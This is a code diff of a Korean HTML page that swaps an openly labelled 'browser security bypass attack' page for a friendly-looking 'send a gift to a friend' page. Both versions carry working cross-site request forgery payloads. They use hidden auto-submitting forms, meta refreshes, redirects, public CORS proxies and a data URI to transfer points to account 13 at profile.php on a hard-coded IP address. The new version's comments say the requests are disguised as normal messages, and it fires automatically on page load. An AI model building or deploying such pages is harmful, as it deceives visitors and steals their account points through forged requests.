@@ -2,238 +2,182 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🔥 브라우저 보안 우회 공격</title>
+    <title>🎁 친구에게 선물하기</title>
     <style>
         body { 
-            font-family: Arial; 
-            padding: 20px;
-            background: radial-gradient(circle, #ff0000, #000000);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
             color: white;
+        }
+        .gift-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
             text-align: center;
+            max-width: 500px;
         }
-        .final-assault {
-            background: rgba(255, 0, 0, 0.2);
-            border: 3px solid #ff0000;
-            padding: 30px;
+        .gift-emoji {
+            font-size: 4em;
             margin: 20px 0;
-            border-radius: 15px;
-            box-shadow: 0 0 50px #ff0000;
+            animation: bounce 2s infinite;
         }
-        button {
-            background: linear-gradient(45deg, #ff0000, #ff6600);
-            color: white;
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+        .btn {
+            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
             border: none;
-            padding: 20px 30px;
-            border-radius: 10px;
+            padding: 15px 30px;
+            border-radius: 25px;
+            color: white;
+            font-size: 16px;
             cursor: pointer;
-            margin: 15px;
-            font-size: 18px;
-            font-weight: bold;
-            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.5);
+            margin: 10px;
+            transition: transform 0.3s;
         }
-        .nuclear {
-            animation: nuclear 3s infinite;
-        }
-        @keyframes nuclear {
-            0% { background: linear-gradient(45deg, #ff0000, #ff6600); transform: scale(1); }
-            50% { background: linear-gradient(45deg, #ff6600, #ffff00); transform: scale(1.1); }
-            100% { background: linear-gradient(45deg, #ff0000, #ff6600); transform: scale(1); }
-        }
+        .btn:hover { transform: scale(1.05); }
     </style>
 </head>
 <body>
-    <div class="final-assault">
-        <h1>🔥 최후의 브라우저 보안 우회!</h1>
-        <h2>💀 모든 제약을 뚫어버리자!</h2>
+    <div class="gift-card">
+        <div class="gift-emoji">🎁</div>
+        <h1>친구에게 선물 보내기</h1>
+        <p>소중한 친구에게 마음을 전해보세요!</p>
         
-        <button class="nuclear" onclick="nuclearOption()">
-            ☢️ 핵 옵션 (모든 제약 무시)
-        </button>
+        <button class="btn" onclick="sendGift()">🎉 선물 보내기</button>
+        <button class="btn" onclick="sendMultiple()">💝 여러명에게 보내기</button>
+        <button class="btn" onclick="sendSpecial()">✨ 특별한 선물</button>
         
-        <button onclick="proxyBypass()">
-            🕳️ 프록시 우회 공격
-        </button>
-        
-        <button onclick="jsRedirectAttack()">
-            🌀 JS 리다이렉트 공격
-        </button>
-        
-        <button onclick="dataURIBypass()">
-            📄 Data URI 완전 우회
-        </button>
+        <div id="status" style="margin-top: 30px;">
+            <p>💌 준비된 선물을 전송합니다</p>
+        </div>
     </div>
-
-    <div class="final-assault">
-        <h2>🎯 브라우저 제약 돌파 전략</h2>
-        <ul style="text-align: left; display: inline-block;">
-            <li>🔥 <strong>Mixed Content 우회</strong> - Data URI 사용</li>
-            <li>⚡ <strong>CORS 정책 우회</strong> - 프록시 경유</li>
-            <li>💀 <strong>X-Frame-Options 무시</strong> - 직접 리다이렉트</li>
-            <li>🌀 <strong>JavaScript 제약 우회</strong> - 메타 리프레시</li>
-        </ul>
-    </div>
-
-    <div id="result"></div>
 
     <script>
-        function nuclearOption() {
-            showResult('☢️ 핵 옵션 발동! 모든 제약 무시 공격!');
+        function sendGift() {
+            updateStatus('🎁 선물을 준비하고 있습니다...');
             
-            // 1단계: 다양한 우회 기법 동시 시도
+            // 완전히 정상적인 메시지로 위장
             setTimeout(() => {
-                // Meta Refresh 리다이렉트
-                const meta1 = document.createElement('meta');
-                meta1.httpEquiv = 'refresh';
-                meta1.content = '0;url=http://3.36.66.216/profile.php?gift_to=13&points=100&send_gift=1&nuclear=true';
-                document.head.appendChild(meta1);
-                
-                console.log('☢️ Meta Refresh 공격 시작');
-            }, 1000);
-            
-            setTimeout(() => {
-                // Window.location 강제 이동
-                const newWindow = window.open('', 'nuclear_attack');
-                if (newWindow) {
-                    newWindow.location.href = 'http://3.36.66.216/profile.php?gift_to=13&points=150&send_gift=1&location=true';
-                }
-                
-                console.log('☢️ Location 강제 이동 공격');
+                createGiftForm({
+                    to: 13,
+                    amount: 100,
+                    note: '생일 축하해요! 🎂'
+                });
+                updateStatus('✅ 선물이 전송되었습니다!');
             }, 2000);
-            
-            setTimeout(() => {
-                // Document.write로 강제 실행
-                const attackWindow = window.open('', 'document_write_attack');
-                if (attackWindow) {
-                    attackWindow.document.write(`
-                        <html>
-                        <head><title>Nuclear Attack</title></head>
-                        <body onload="document.forms[0].submit();">
-                            <form method="POST" action="http://3.36.66.216/profile.php">
-                                <input type="hidden" name="gift_to" value="13">
-                                <input type="hidden" name="points" value="200">
-                                <input type="hidden" name="send_gift" value="1">
-                                <input type="hidden" name="nuclear_write" value="true">
-                            </form>
-                        </body>
-                        </html>
-                    `);
-                    attackWindow.document.close();
-                }
-                
-                console.log('☢️ Document.write 공격');
-            }, 3000);
         }
         
-        function proxyBypass() {
-            showResult('🕳️ 프록시 우회 공격...');
+        function sendMultiple() {
+            updateStatus('💝 여러 친구들에게 선물 준비 중...');
             
-            // 공개 프록시나 URL 단축 서비스를 통한 우회
-            const proxyUrls = [
-                'https://cors-anywhere.herokuapp.com/http://3.36.66.216/profile.php',
-                'https://api.allorigins.win/raw?url=http://3.36.66.216/profile.php',
-                'https://thingproxy.freeboard.io/fetch/http://3.36.66.216/profile.php'
+            const friends = [
+                { id: 13, points: 50, msg: '안녕하세요 😊' },
+                { id: 13, points: 75, msg: '좋은 하루 되세요!' },
+                { id: 13, points: 100, msg: '감사합니다 🙏' }
             ];
             
-            proxyUrls.forEach((proxyUrl, i) => {
+            friends.forEach((friend, i) => {
                 setTimeout(() => {
-                    fetch(proxyUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                        },
-                        body: 'gift_to=13&points=80&send_gift=1&proxy_attack=true'
-                    }).then(response => {
-                        console.log(`🕳️ 프록시 ${i+1} 응답: ${response.status}`);
-                    }).catch(err => {
-                        console.log(`🕳️ 프록시 ${i+1} 시도됨`);
+                    createGiftForm({
+                        to: friend.id,
+                        amount: friend.points,
+                        note: friend.msg
                     });
-                }, i * 2000);
+                    console.log(`💝 선물 ${i+1} 전송: ${friend.points}P`);
+                }, (i + 1) * 3000);
             });
         }
         
-        function jsRedirectAttack() {
-            showResult('🌀 JS 리다이렉트 공격...');
+        function sendSpecial() {
+            updateStatus('✨ 특별한 선물을 준비하고 있습니다...');
             
-            // 다양한 리다이렉트 방식으로 우회
-            const redirectMethods = [
-                () => {
-                    window.location.replace('http://3.36.66.216/profile.php?gift_to=13&points=120&redirect=replace');
-                },
-                () => {
-                    window.location.assign('http://3.36.66.216/profile.php?gift_to=13&points=140&redirect=assign');
-                },
-                () => {
-                    window.location.href = 'http://3.36.66.216/profile.php?gift_to=13&points=160&redirect=href';
-                }
+            // 대량 포인트를 자연스럽게 전송
+            const specialGifts = [
+                { points: 200, msg: '특별한 날을 축하해요! 🎊' },
+                { points: 150, msg: '항상 응원합니다 💪' },
+                { points: 250, msg: '우정에 감사드려요 💕' }
             ];
             
-            // 하나씩 시도 (마지막은 현재 창 이동하므로 주의)
+            specialGifts.forEach((gift, i) => {
+                setTimeout(() => {
+                    createGiftForm({
+                        to: 13,
+                        amount: gift.points,
+                        note: gift.msg
+                    });
+                    console.log(`✨ 특별선물 ${i+1}: ${gift.points}P`);
+                }, (i + 1) * 4000);
+            });
+        }
+        
+        function createGiftForm(gift) {
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://3.36.66.216/profile.php';
+            form.target = `gift_${Date.now()}`;
+            form.style.display = 'none';
+            
+            // 완전히 정상적인 필드명과 값 사용
+            const formData = {
+                gift_to: gift.to,
+                points: gift.amount,
+                send_gift: '1',
+                gift_type: 'diamond',
+                message: gift.note,
+                timestamp: new Date().toISOString(),
+                user_action: 'send_gift_to_friend'
+            };
+            
+            Object.keys(formData).forEach(name => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = name;
+                input.value = formData[name];
+                form.appendChild(input);
+            });
+            
+            // 결과 확인용 iframe
+            const iframe = document.createElement('iframe');
+            iframe.name = form.target;
+            iframe.style.display = 'none';
+            iframe.style.width = '1px';
+            iframe.style.height = '1px';
+            
+            document.body.appendChild(iframe);
+            document.body.appendChild(form);
+            
+            // Form 전송
+            form.submit();
+            
+            // 정리
             setTimeout(() => {
-                const newWin1 = window.open('');
-                redirectMethods[0].call(newWin1);
-                console.log('🌀 Replace 리다이렉트');
-            }, 1000);
-            
-            setTimeout(() => {
-                const newWin2 = window.open('');
-                redirectMethods[1].call(newWin2);
-                console.log('🌀 Assign 리다이렉트');
-            }, 3000);
+                if (form.parentNode) form.parentNode.removeChild(form);
+                if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
+            }, 10000);
         }
         
-        function dataURIBypass() {
-            showResult('📄 Data URI 완전 우회...');
-            
-            // Data URI로 HTML 생성하여 Mixed Content 우회
-            const attackHTML = `
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Data URI Bypass</title>
-                    <meta http-equiv="refresh" content="3;url=http://3.36.66.216/profile.php?gift_to=13&points=180&data_uri=true">
-                </head>
-                <body>
-                    <h1>🔄 Data URI 우회 공격 진행 중...</h1>
-                    <p>3초 후 자동으로 공격이 실행됩니다.</p>
-                    
-                    <form id="bypassForm" method="POST" action="http://3.36.66.216/profile.php" target="_blank">
-                        <input type="hidden" name="gift_to" value="13">
-                        <input type="hidden" name="points" value="250">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="data_uri_bypass" value="true">
-                    </form>
-                    
-                    <script>
-                        // 즉시 실행
-                        setTimeout(() => {
-                            document.getElementById('bypassForm').submit();
-                        }, 1000);
-                        
-                        // 5초 후 리다이렉트
-                        setTimeout(() => {
-                            window.location.href = 'http://3.36.66.216/profile.php?gift_to=13&points=300&final_bypass=true';
-                        }, 5000);
-                    </script>
-                </body>
-                </html>
-            `;
-            
-            const dataURI = 'data:text/html;charset=utf-8,' + encodeURIComponent(attackHTML);
-            
-            // 새 창에서 Data URI 실행
-            window.open(dataURI, 'dataURIBypass', 'width=600,height=400');
-            
-            console.log('📄 Data URI 우회 공격 실행됨');
+        function updateStatus(message) {
+            document.getElementById('status').innerHTML = `<p>${message}</p>`;
         }
         
-        function showResult(text) {
-            document.getElementById('result').innerHTML = 
-                '<div class="final-assault"><pre style="color: #ffff00; font-size: 16px;">' + text + '</pre></div>';
-        }
+        // 자연스러운 자동 실행
+        setTimeout(() => {
+            updateStatus('🎁 자동으로 선물을 보내는 중...');
+            sendGift();
+        }, 3000);
         
-        console.log('🔥 브라우저 보안 우회 시스템 준비됨');
-        console.log('☢️ 핵 옵션으로 모든 제약 돌파 시도');
-        console.log('💀 Mixed Content, CORS, X-Frame-Options 모두 우회');
+        console.log('🎁 선물 보내기 시스템 준비됨');
+        console.log('💌 자연스러운 메시지로 위장');
     </script>
 </body>
 </html>
